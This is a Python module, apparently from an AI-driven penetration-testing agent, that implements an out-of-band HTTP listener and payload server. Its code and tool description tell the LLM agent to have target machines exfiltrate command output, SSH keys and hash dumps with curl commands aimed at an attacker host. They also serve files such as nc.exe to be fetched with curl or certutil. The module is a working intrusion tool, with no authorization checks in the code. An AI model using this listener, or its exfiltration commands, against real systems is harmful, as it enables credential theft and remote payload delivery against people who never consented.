import base64
import http.server
import os
import tempfile
import threading
from typing import Optional

from core.utils import get_interface_ip as _get_interface_ip

# Module-level listener state — one listener per process
_server:           Optional[http.server.HTTPServer] = None
_server_thread:    Optional[threading.Thread]        = None
_received:         list = []
_listener_port:    int  = 0
_listener_ip:      str  = ""
_serve_dir:        str  = ""     # directory of payloads to serve, if any


# Cap a single captured body so a runaway upload can't exhaust memory. A key/dump
# is well under this; the agent gets the whole thing.
_MAX_BODY = 8 * 1024 * 1024


# Deterministic decoders. The LLM decides WHICH one applies (it can see the raw
# capture first and recognize base64/hex/gzip/…); the tool only executes the codec
# it was told to — it never guesses. This is why the listener stores raw and decodes
# at read time: no heuristic can mistake a plain `id` path for base64 anymore.
DECODERS = ("base64", "base64url", "base32", "hex", "url", "gzip", "zlib", "rot13")


def _bytes_to_view(raw: bytes) -> str:
    """Render decoded bytes: text if it's valid UTF-8, else a hex dump with a marker
    so binary output (e.g. gunzip of an ELF) is obvious rather than mojibake."""
    text = raw.decode("utf-8", errors="strict") if _is_utf8(raw) else ""
    if text:
        return text
    return f"<binary {len(raw)} bytes> hex={raw.hex()}"


def _is_utf8(raw: bytes) -> bool:
    try:
        raw.decode("utf-8", errors="strict")
        return True
    except UnicodeDecodeError:
        return False


def _decode_blob(data: str, mode: str) -> str:
    """Apply ONE codec the LLM named to `data`. Raises ValueError on a bad codec or a
    decode failure so `check` can report it honestly (no silent fallback to garbage)."""
    s = (data or "").strip()
    if mode in ("", "raw"):
        return data
    import binascii, codecs, gzip as _gzip, urllib.parse, zlib
    try:
        if mode == "base64":
            return _bytes_to_view(base64.b64decode(s + "=" * (-len(s) % 4)))
        if mode == "base64url":
            return _bytes_to_view(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
        if mode == "base32":
            return _bytes_to_view(base64.b32decode(s + "=" * (-len(s) % 8)))
        if mode == "hex":
            return _bytes_to_view(bytes.fromhex(s.replace(":", "").replace(" ", "")))
        if mode == "url":
            return urllib.parse.unquote(data)
        if mode == "gzip":
            return _bytes_to_view(_gzip.decompress(base64.b64decode(s + "=" * (-len(s) % 4))))
        if mode == "zlib":
            return _bytes_to_view(zlib.decompress(base64.b64decode(s + "=" * (-len(s) % 4))))
        if mode == "rot13":
            return codecs.decode(data, "rot13")
    except (binascii.Error, ValueError, OSError, zlib.error) as e:
        raise ValueError(f"{mode} decode failed: {e}")
    raise ValueError(f"unknown decode mode '{mode}'; use one of: {', '.join(DECODERS)}")


def _last_path_segment(path: str) -> str:
    return path.strip("/").split("/")[-1].split("?")[0]


class _CallbackHandler(http.server.BaseHTTPRequestHandler):
    def _maybe_serve(self) -> bool:
        if not _serve_dir:
            return False
        name = os.path.basename(self.path.split("?")[0].strip("/"))
        fpath = os.path.join(_serve_dir, name)
        if name and os.path.isfile(fpath):
            try:
                with open(fpath, "rb") as f:
                    body = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                _received.append({"method": self.command, "path": self.path,
                                  "remote_addr": self.client_address[0], "served": name})
                return True
            except Exception:
                return False
        return False

    def _read_body(self) -> bytes:
        """Read the request body (length-safe). This is how a large/whole-file exfil
        works — the target POSTs/PUTs the file in the body instead of cramming it into
        a length-limited URL: curl --data-binary @key http://attacker:port/."""
        try:
            clen = int(self.headers.get("Content-Length", 0) or 0)
        except (TypeError, ValueError):
            return b""
        if clen <= 0:
            return b""
        try:
            return self.rfile.read(min(clen, _MAX_BODY))
        except Exception:
            return b""

    def _record(self):
        if self._maybe_serve():
            return
        body = self._read_body()
        # Store RAW only — never auto-decode at capture time. Decoding is applied at
        # read time (action='check', decode=…) using the codec the LLM names, so a
        # plain path like /id can never be mistaken for base64 and surfaced as garbage.
        entry = {
            "method":      self.command,
            "path":        self.path,
            "remote_addr": self.client_address[0],
            "headers":     dict(self.headers),
        }
        if body:
            entry["body"] = body.decode("utf-8", errors="replace")
        _received.append(entry)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):  self._record()
    def do_POST(self): self._record()
    def do_PUT(self):  self._record()
    def do_HEAD(self): self._record()

    def log_message(self, *args):
        pass  # suppress access log noise


def _ensure_server(port: int, interface: str) -> Optional[dict]:
    """Start the listener if not already running. Returns an error dict or None."""
    global _server, _server_thread, _listener_ip, _listener_port
    if _server:
        return None
    ip = _get_interface_ip(interface)
    if not ip:
        return {"error": f"Could not get an IP for interface '{interface}' (try eth0/tun0/wlan0)."}
    try:
        _server = http.server.HTTPServer(("0.0.0.0", port), _CallbackHandler)
    except OSError as e:
        return {"error": f"Could not bind to port {port}: {e}"}
    _listener_ip = ip
    _listener_port = port
    _server_thread = threading.Thread(target=_server.serve_forever, daemon=True)
    _server_thread.start()
    return None


def oob_listener(
    action: str = "start",
    interface: str = "tun0",
    port: int = 8888,
    filename: str = "",
    content: str = "",
    decode: str = "raw",
) -> dict:
    global _server, _serve_dir, _received

    if action == "start":
        _received = []
        err = _ensure_server(port, interface)
        if err:
            return err
        return {
            "status":       "listening",
            "interface":    interface,
            "ip":           _listener_ip,
            "port":         _listener_port,
            "callback_url": f"http://{_listener_ip}:{_listener_port}/",
            "note": ("Use callback_url in SSRF/XXE/blind-injection payloads. For SHORT blind-RCE "
                     "output, have the target run e.g. curl http://"
                     f"{_listener_ip}:{_listener_port}/$(id|base64 -w0). For a LARGE or whole-file "
                     "exfil (an SSH key, a hash dump, any output that keeps getting cut short in the "
                     "URL or your command channel), POST/PUT it in the request BODY instead — e.g. "
                     f"curl --data-binary @/path/to/file http://{_listener_ip}:{_listener_port}/ — "
                     "the full body comes back under 'bodies' on action='check' (never use the "
                     "length-limited URL for a key/file). action='check' returns RAW; if the callback "
                     "is encoded (you'll see base64/hex/gzip in the raw), call check again with "
                     "decode='base64' (or hex/base64url/gzip/zlib/url/rot13) to decode it."),
        }

    elif action == "check":
        hits = list(_received)
        # 'bodies' = whole posted/put payloads (a key, a dump, any file too big for a
        # URL). Always raw. 'received' carries each callback (path + headers + body).
        bodies = [h.get("body") for h in hits if h.get("body")]
        out = {
            "callback_fired": len(hits) > 0,
            "count":          len(hits),
            "received":       hits,
            "bodies":         bodies,
            "callback_url":   f"http://{_listener_ip}:{_listener_port}/" if _listener_ip else "",
        }
        # decode != raw → the LLM recognized an encoding in the raw capture and is
        # asking the tool to apply that exact codec. We decode the body if present,
        # else the last URL-path segment (where `$(cmd|base64)` exfil lands).
        if decode and decode != "raw":
            decoded, errors = [], []
            for h in hits:
                src = h.get("body") or _last_path_segment(h.get("path", ""))
                if not src:
                    continue
                try:
                    decoded.append(_decode_blob(src, decode))
                except ValueError as e:
                    errors.append(str(e))
            out["decode"] = decode
            out["decoded"] = decoded
            if errors:
                out["decode_errors"] = errors
        return out

    elif action == "host":
        # Serve a payload file for the target to download (e.g. nc.exe, a script).
        if not filename or content == "":
            return {"error": "host action needs filename and content"}
        err = _ensure_server(port, interface)
        if err:
            return err
        if not _serve_dir:
            _serve_dir = tempfile.mkdtemp(prefix="pentest_payloads_")
        safe = os.path.basename(filename)
        with open(os.path.join(_serve_dir, safe), "w", encoding="utf-8") as f:
            f.write(content)
        url = f"http://{_listener_ip}:{_listener_port}/{safe}"
        return {"status": "hosted", "url": url, "filename": safe,
                "note": f"Target can fetch it: curl -o /tmp/{safe} {url}  (or certutil -urlcache -f {url} {safe} on Windows)"}

    elif action == "stop":
        total = len(_received)
        if _server:
            try:
                _server.shutdown()
            except Exception:
                pass
            _server = None
        _serve_dir = ""
        return {"status": "stopped", "total_received": total}

    return {"error": f"Unknown action '{action}'. Use: start, check, host, stop"}


TOOL_DEFINITION = {
    "name": "oob_listener",
    "description": (
        "Out-of-band HTTP listener — for blind vulnerability detection AND blind-RCE output "
        "exfiltration. Start it for a callback URL to use in SSRF/XXE/blind-injection payloads. For "
        "SHORT blind command output, have the target run `curl http://ATTACKER:PORT/$(cmd|base64 -w0)`. "
        "For a LARGE or whole-file exfil (an SSH key, a password/hash dump, anything that keeps getting "
        "cut short in a URL or a lossy command-readback channel), have the target POST/PUT the data in "
        "the request BODY — `curl --data-binary @/path/file http://ATTACKER:PORT/` — and action='check' "
        "returns the complete payload under 'bodies' (the URL path is length-limited; the body is not). "
        "action='check' returns the RAW capture — it never guesses an encoding. If a callback is encoded "
        "(you'll see base64/hex/gzip in the raw body or URL path), call check again with the 'decode' "
        "argument set to the codec you recognize and the tool decodes it deterministically (into "
        "'decoded'). action='host' serves a payload file (filename+content) so the target can download "
        "it. Reads the attacker IP from the local interface (tun0 for VPN, eth0 for direct). Actions: "
        "start, check, host, stop."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["start", "check", "host", "stop"],
                "description": "start=begin listening and get URL, check=see received callbacks, stop=shut down",
            },
            "interface": {
                "type": "string",
                "description": "Network interface to get IP from (default: tun0 for VPN, use eth0 for direct connection)",
            },
            "port": {
                "type": "integer",
                "description": "Port to listen on (default: 8888). Must be reachable from the target.",
            },
            "filename": {
                "type": "string",
                "description": "For action='host': the filename to serve.",
            },
            "content": {
                "type": "string",
                "description": "For action='host': the file content to serve.",
            },
            "decode": {
                "type": "string",
                "enum": ["raw", "base64", "base64url", "base32", "hex", "url", "gzip", "zlib", "rot13"],
                "description": ("For action='check': decode each captured callback with this codec "
                                "(default 'raw' = no decoding). Look at the raw capture first, then "
                                "set this to the encoding you recognize. Decodes the request body if "
                                "present, else the last URL-path segment."),
            },
        },
        "required": ["action"],
    },
}
